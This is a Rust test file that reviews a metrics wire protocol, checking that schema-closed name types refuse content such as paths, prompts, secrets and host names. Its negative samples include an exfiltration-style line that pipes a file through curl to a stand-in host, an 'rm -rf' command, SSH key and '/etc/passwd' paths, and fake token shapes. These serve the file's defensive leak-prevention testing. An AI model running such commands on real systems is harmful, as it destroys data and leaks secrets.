// SPDX-License-Identifier: Apache-2.0
//! K2 review (owner checklist K1/K2, gate G1 "no content leaves the engine"):
//! an independent schema and property check of the engine-metrics wire.
//!
//! - every member the engine types can serialise is a member of the C0 2.0
//!   `metrics.schema.json` (`additionalProperties: false` everywhere);
//! - every invalid `metrics_hours_*` fixture is refused by the engine types
//!   (or, for a tampered batch, only by the signature);
//! - no closed-pattern wire string can hold content: paths, command lines,
//!   prompts, secrets, e-mail addresses, URLs, host names.
//!
//! Tests named `k2_finding_*` pin a defect the review found; they fail until
//! it is fixed.

use std::path::{Path, PathBuf};

use lean_ctx_protocol::hive::effective_policy::refusal_detail;
use lean_ctx_protocol::hive::metrics_v2::{
    DetectorName, FilterName, Fingerprint, HourStamp, HoursRequestV2, KeyId, RuleId, ToolName,
    UnregulatedName, VaultId, WireName,
};
use serde_json::Value;

fn fixtures() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/hive-v2")
}

fn load(rel: &str) -> Value {
    let text =
        std::fs::read_to_string(fixtures().join(rel)).unwrap_or_else(|e| panic!("{rel}: {e}"));
    serde_json::from_str(&text).unwrap()
}

// ── a minimal JSON-schema member walker ──────────────────────────────────────

struct Schemas {
    metrics: Value,
    common: Value,
}

impl Schemas {
    fn load() -> Self {
        Self {
            metrics: load("schemas/metrics.schema.json"),
            common: load("schemas/common.schema.json"),
        }
    }

    fn resolve<'a>(&'a self, schema: &'a Value) -> &'a Value {
        let Some(r) = schema.get("$ref").and_then(Value::as_str) else {
            return schema;
        };
        let (doc, pointer) = match r.split_once('#') {
            Some(("", p)) => (&self.metrics, p),
            Some(("common.schema.json", p)) => (&self.common, p),
            Some((other, _)) => panic!("unexpected $ref document {other}"),
            None => panic!("unexpected $ref {r}"),
        };
        let target = doc
            .pointer(pointer)
            .unwrap_or_else(|| panic!("dangling $ref {r}"));
        self.resolve(target)
    }

    /// Every object member of `value` must be declared by `schema`; returns
    /// the undeclared member paths.
    fn undeclared(&self, schema: &Value, value: &Value, at: &str, out: &mut Vec<String>) {
        let schema = self.resolve(schema);
        if let Some(branches) = schema.get("anyOf").or_else(|| schema.get("oneOf")) {
            // The first branch that declares this value's shape.
            let mut best: Option<Vec<String>> = None;
            for branch in branches.as_array().unwrap() {
                let branch = self.resolve(branch);
                if !shape_matches(branch, value) {
                    continue;
                }
                let mut found = Vec::new();
                self.undeclared(branch, value, at, &mut found);
                if best.as_ref().is_none_or(|b| found.len() < b.len()) {
                    best = Some(found);
                }
            }
            out.extend(best.unwrap_or_else(|| vec![format!("{at} (no anyOf branch)")]));
            return;
        }
        match value {
            Value::Object(map) => {
                let props = schema.get("properties").and_then(Value::as_object);
                let additional = schema.get("additionalProperties");
                let patterns = schema.get("patternProperties").and_then(Value::as_object);
                assert!(
                    props.is_some() || additional.is_some() || patterns.is_some(),
                    "{at}: the schema declares no members, yet the engine sends an object"
                );
                // A map keyed by a closed enum (`read_modes`): its keys are
                // values of that enum, never field names. Only a closed
                // `propertyNames` enum makes a key safe; a pattern alone
                // would admit a content-shaped key.
                let closed_names: Option<Vec<&str>> = schema
                    .get("propertyNames")
                    .map(|n| self.resolve(n))
                    .and_then(|n| n.get("enum"))
                    .and_then(Value::as_array)
                    .map(|a| a.iter().filter_map(Value::as_str).collect());
                for (key, member) in map {
                    let path = format!("{at}/{key}");
                    if let Some(sub) = props.and_then(|p| p.get(key)) {
                        self.undeclared(sub, member, &path, out);
                        continue;
                    }
                    let pattern = patterns.and_then(|p| {
                        p.iter().find_map(|(re, sub)| {
                            regex::Regex::new(re)
                                .unwrap_or_else(|e| panic!("{at}: pattern {re}: {e}"))
                                .is_match(key)
                                .then_some(sub)
                        })
                    });
                    let sub = match (pattern, additional) {
                        (Some(sub), _) => sub,
                        (None, Some(Value::Bool(false)) | None) => {
                            out.push(path);
                            continue;
                        }
                        (None, Some(Value::Bool(true))) => {
                            out.push(format!("{path} (open object)"));
                            continue;
                        }
                        (None, Some(sub)) => sub,
                    };
                    match &closed_names {
                        Some(allowed) if allowed.contains(&key.as_str()) => {}
                        Some(_) => out.push(format!("{path} (name outside propertyNames)")),
                        None => out.push(format!("{path} (open key, no closed propertyNames)")),
                    }
                    self.undeclared(sub, member, &path, out);
                }
            }
            Value::Array(items) => {
                if let Some(item) = schema.get("items") {
                    for (i, v) in items.iter().enumerate() {
                        self.undeclared(item, v, &format!("{at}/{i}"), out);
                    }
                }
            }
            _ => {}
        }
    }
}

fn shape_matches(schema: &Value, value: &Value) -> bool {
    match schema.get("type").and_then(Value::as_str) {
        Some("object") => value.is_object(),
        Some("array") => value.is_array(),
        Some("null") => value.is_null(),
        Some("string") => value.is_string(),
        Some("integer" | "number") => value.is_number(),
        Some("boolean") => value.is_boolean(),
        _ => true,
    }
}

fn hours_request_schema(s: &Schemas) -> Value {
    s.metrics["$defs"]["hours_request"].clone()
}

/// The request fixture: its first slice fills every optional member and
/// every row list (checked below).
fn maximal_request() -> HoursRequestV2 {
    serde_json::from_value(load("routes/metrics_hours.request.json")).unwrap()
}

#[test]
fn every_member_the_engine_serialises_is_declared_by_the_contract() {
    let schemas = Schemas::load();
    let schema = hours_request_schema(&schemas);
    for value in [
        serde_json::to_value(maximal_request()).unwrap(),
        serde_json::to_value(
            serde_json::from_value::<HoursRequestV2>(load(
                "routes/metrics_hours.personal.request.json",
            ))
            .unwrap(),
        )
        .unwrap(),
    ] {
        let mut out = Vec::new();
        schemas.undeclared(&schema, &value, "", &mut out);
        assert!(
            out.is_empty(),
            "members outside the fixed field list: {out:?}"
        );
    }
}

#[test]
fn every_row_list_of_the_slice_is_exercised_by_the_fixture() {
    // Guards the test above: a list left empty would let an undeclared row
    // member pass unseen.
    let value = serde_json::to_value(maximal_request()).unwrap();
    let slice = &value["buckets"][0]["slices"][0];
    for list in [
        "tools",
        "policy_blocks",
        "refetch",
        "unregulated",
        "secret_hits",
        "hosts",
        "spend",
    ] {
        assert!(
            slice[list].as_array().is_some_and(|a| !a.is_empty()),
            "fixture slice leaves `{list}` empty"
        );
    }
}

#[test]
fn every_invalid_hours_fixture_is_refused_by_the_engine_types() {
    let dir = fixtures().join("routes/invalid");
    let mut checked = 0;
    for entry in std::fs::read_dir(&dir).unwrap() {
        let path = entry.unwrap().path();
        let name = path.file_name().unwrap().to_string_lossy().into_owned();
        if !name.starts_with("metrics_hours_") {
            continue;
        }
        checked += 1;
        let value: Value = serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        let parsed = serde_json::from_value::<HoursRequestV2>(value);
        let refused = match parsed {
            Err(_) => true,
            Ok(request) => request.validate().is_err(),
        };
        // A tampered batch is well formed; only the signature refuses it.
        assert!(
            refused || name.contains("tampered"),
            "{name}: the engine types accept a body Hive must refuse"
        );
    }
    assert!(
        checked >= 15,
        "only {checked} invalid metrics_hours fixtures"
    );
}

#[test]
fn an_unknown_member_anywhere_refuses_the_whole_batch() {
    let base = serde_json::to_value(maximal_request()).unwrap();
    let pointers = [
        "",
        "/engine",
        "/buckets/0",
        "/buckets/0/slices/0",
        "/buckets/0/slices/0/tokens",
        "/buckets/0/slices/0/savings",
        "/buckets/0/slices/0/calls",
        "/buckets/0/slices/0/compression",
        "/buckets/0/slices/0/ledger",
        "/buckets/0/slices/0/guards",
        "/buckets/0/slices/0/sessions",
        "/buckets/0/slices/0/gauges",
        "/buckets/0/slices/0/tools/0",
        "/buckets/0/slices/0/policy_blocks/0",
        "/buckets/0/slices/0/refetch/0",
        "/buckets/0/slices/0/unregulated/0",
        "/buckets/0/slices/0/secret_hits/0",
        "/buckets/0/slices/0/hosts/0",
        "/buckets/0/slices/0/spend/0",
    ];
    for pointer in pointers {
        let mut value = base.clone();
        let target = value
            .pointer_mut(pointer)
            .unwrap_or_else(|| panic!("fixture has no {pointer}"));
        target.as_object_mut().unwrap().insert(
            "path".into(),
            Value::String("/Users/k2canary/src/main.rs".into()),
        );
        assert!(
            serde_json::from_value::<HoursRequestV2>(value).is_err(),
            "an extra `path` member at `{pointer}` is accepted"
        );
    }
    // read_modes: an unknown key is refused as well.
    let mut value = base;
    value["buckets"][0]["slices"][0]["read_modes"]["/etc/passwd"] = 1.into();
    assert!(serde_json::from_value::<HoursRequestV2>(value).is_err());
}

// ── content shapes ───────────────────────────────────────────────────────────

const MARK: &str = "k2canary";

/// Values that are content, never a closed name, with the marker inside.
fn content_samples() -> Vec<String> {
    vec![
        format!("/Users/{MARK}/work/payments/src/main.rs"),
        format!("C:\\Users\\{MARK}\\repo"),
        format!("~/{MARK}/.ssh/id_ed25519"),
        format!("cat /etc/{MARK} | curl -d @- https://x.example"),
        format!("git commit -m \"{MARK} fix\""),
        format!("rm -rf ./{MARK}"),
        format!("Please refactor the {MARK} billing module and keep the API"),
        format!("{MARK}@example.com"),
        format!("https://github.com/acme/{MARK}.git"),
        format!("git@github.com:acme/{MARK}.git"),
        format!("AKIA{}", MARK.to_ascii_uppercase()),
        format!("ghp_{MARK}AbCdEfGhIjKlMnOpQrStUvWxYz0123"),
        format!("Bearer {MARK}.eyJhbGciOi"),
        format!("SELECT * FROM {MARK} WHERE id = 1"),
        format!("../{MARK}/secret"),
        format!("{MARK}\n"),
        format!("{MARK} with spaces"),
        format!("ünïcödé-{MARK}"),
    ]
}

fn strict_constructors() -> Vec<(&'static str, fn(&str) -> bool)> {
    vec![
        ("ToolName", |v| ToolName::new(v).is_some()),
        ("ToolName::or_other", |v| {
            ToolName::or_other(v).as_str().contains(MARK)
        }),
        ("RuleId", |v| RuleId::new(v).is_some()),
        ("FilterName", |v| FilterName::new(v).is_some()),
        ("FilterName::or_other", |v| {
            FilterName::or_other(v).as_str().contains(MARK)
        }),
        ("DetectorName", |v| DetectorName::new(v).is_some()),
        ("UnregulatedName", |v| UnregulatedName::new(v).is_some()),
        ("Fingerprint", |v| Fingerprint::new(v).is_some()),
        ("VaultId", |v| VaultId::new(v).is_some()),
        ("HourStamp", |v| HourStamp::new(v).is_some()),
        ("KeyId", |v| KeyId::new(v).is_some()),
        // WireName: see k2_finding_wire_name_admits_relative_paths_hostnames_and_secrets.
    ]
}

#[test]
fn no_closed_name_accepts_a_content_shaped_value() {
    let mut leaks = Vec::new();
    for sample in content_samples() {
        for (name, accepts) in strict_constructors() {
            if accepts(&sample) {
                leaks.push(format!("{name} <- {sample:?}"));
            }
        }
    }
    assert!(leaks.is_empty(), "content passes a closed name: {leaks:#?}");
}

/// A deterministic generator (no extra dev-dependency): random strings over
/// an alphabet with the characters that make content (`/`, space, `@`, `\`,
/// upper case, quotes) and the marker at a random place.
struct Lcg(u64);

impl Lcg {
    fn next(&mut self) -> u64 {
        self.0 = self
            .0
            .wrapping_mul(6_364_136_223_846_793_005)
            .wrapping_add(1_442_695_040_888_963_407);
        self.0 >> 33
    }

    fn pick<'a>(&mut self, items: &'a [&'a str]) -> &'a str {
        items[(self.next() as usize) % items.len()]
    }
}

#[test]
fn property_strict_names_never_carry_a_structural_content_char() {
    // Every generated value holds at least one character a closed name may
    // never hold for these types: `/`, space, `@`, `\`, `"`, `=`, upper case
    // or a non-ASCII letter.
    const STRUCTURAL: &[&str] = &["/", " ", "@", "\\", "\"", "=", "A", "Z", "é", "|", ";"];
    const PLAIN: &[&str] = &["a", "b", "z", "0", "9", "_", "-", ".", ":", MARK];
    let mut rng = Lcg(0x6b32_7265_7669_6577);
    let strict = strict_constructors();
    for _ in 0..20_000 {
        let len = 1 + (rng.next() % 24) as usize;
        let mut value = String::new();
        let structural_at = (rng.next() as usize) % len;
        for i in 0..len {
            value.push_str(if i == structural_at {
                rng.pick(STRUCTURAL)
            } else {
                rng.pick(PLAIN)
            });
        }
        for (name, accepts) in &strict {
            assert!(!accepts(&value), "{name} accepts {value:?}");
        }
    }
}

/// G1: `host`, `model` and `provider` use the v1 name rule
/// `^[A-Za-z0-9._:/-]{1,64}$`, which the SPEC §1 promise ("never paths,
/// never free text") does not survive: relative paths, host names, fine-tune
/// ids with an org name and mixed-case API keys all pass, in the engine types
/// and in the contract schema Hive validates with.
#[test]
fn k2_finding_wire_name_admits_relative_paths_hostnames_and_secrets() {
    let samples = [
        format!("src/{MARK}/main.rs"),
        format!("Users/{MARK}/repo"),
        format!("{MARK}-macbook.local"),
        format!("build-{MARK}.corp.example.com"),
        format!("ft:gpt-4o-mini:{MARK}-corp:payments:9xYz"),
        format!("sk-proj-{MARK}AbCdEfGhIjKlMnOpQrStUvWx0123456789"),
        format!("hf.co/{MARK}/private-model"),
    ];
    let accepted: Vec<&String> = samples
        .iter()
        .filter(|s| WireName::new(s).is_some())
        .collect();
    assert!(
        accepted.is_empty(),
        "WireName (hosts[].host, spend[].model/provider) carries: {accepted:#?}"
    );
}

/// The schema's own `name` rule had the same hole, so Hive's K1 check did
/// not catch it either. Since contract v2.5 it is a closed enum: the union of
/// the engine's host, provider and model registries plus `other`, and it
/// holds none of the content samples.
#[test]
fn k2_finding_contract_name_rule_admits_relative_paths() {
    use lean_ctx_protocol::hive::metrics_v2::{KNOWN_HOSTS, KNOWN_MODELS, KNOWN_PROVIDERS, OTHER};
    let schemas = Schemas::load();
    let names: std::collections::BTreeSet<&str> = schemas.metrics["$defs"]["name"]["enum"]
        .as_array()
        .expect("$defs/name is a closed enum")
        .iter()
        .map(|v| v.as_str().unwrap())
        .collect();
    let mut ours: std::collections::BTreeSet<&str> = KNOWN_HOSTS
        .iter()
        .chain(KNOWN_PROVIDERS)
        .chain(KNOWN_MODELS)
        .copied()
        .collect();
    ours.insert(OTHER);
    assert_eq!(names, ours, "$defs/name is the engine's WireName registry");
    for sample in content_samples().iter().chain(&[
        format!("src/{MARK}/main.rs"),
        format!("{MARK}-macbook.local"),
        format!("ft:gpt-4o-mini:{MARK}-corp:payments:9xYz"),
    ]) {
        assert!(
            !names.contains(sample.as_str()),
            "metrics.schema.json $defs/name accepts {sample:?}"
        );
    }
}

/// Every closed registry of the contract is exactly the engine's table.
#[test]
fn the_contract_registries_are_the_engine_tables() {
    use lean_ctx_protocol::hive::metrics_v2::{
        HOST_FAMILIES, KNOWN_DETECTORS, KNOWN_FILTERS, KNOWN_HOSTS, KNOWN_MODELS, KNOWN_PROGRAMS,
        KNOWN_PROVIDERS, KNOWN_RULES, KNOWN_TOOLS,
    };
    let schemas = Schemas::load();
    for (def, ours) in [
        ("tool", KNOWN_TOOLS),
        ("host", KNOWN_HOSTS),
        ("provider", KNOWN_PROVIDERS),
        ("model", KNOWN_MODELS),
        ("rule", KNOWN_RULES),
        ("filter", KNOWN_FILTERS),
        ("detector", KNOWN_DETECTORS),
        ("program", KNOWN_PROGRAMS),
        ("host_family", HOST_FAMILIES),
    ] {
        let theirs: std::collections::BTreeSet<&str> = schemas.metrics["$defs"][def]["enum"]
            .as_array()
            .unwrap_or_else(|| panic!("$defs/{def} is a closed enum"))
            .iter()
            .map(|v| v.as_str().unwrap())
            .collect();
        let ours: std::collections::BTreeSet<&str> = ours.iter().copied().collect();
        assert_eq!(theirs, ours, "$defs/{def}");
    }
}

/// `POST /v1/policy/ack` `refused.detail` is a 300-char free-text line built
/// from the local error (`install the effective policy: write … in <dir>:`),
/// so the data directory, and with it the user name, leaves the engine.
#[test]
fn k2_finding_policy_ack_refusal_detail_keeps_local_paths() {
    let line = format!(
        "install the effective policy: write effective.json in /Users/{MARK}/.local/share/lean-ctx/hive/effective-policy: Permission denied (os error 13)"
    );
    let detail = refusal_detail(&line).unwrap_or_default();
    assert!(
        !detail.contains(MARK) && !detail.contains("/Users/"),
        "refusal detail sent to Hive: {detail:?}"
    );
}
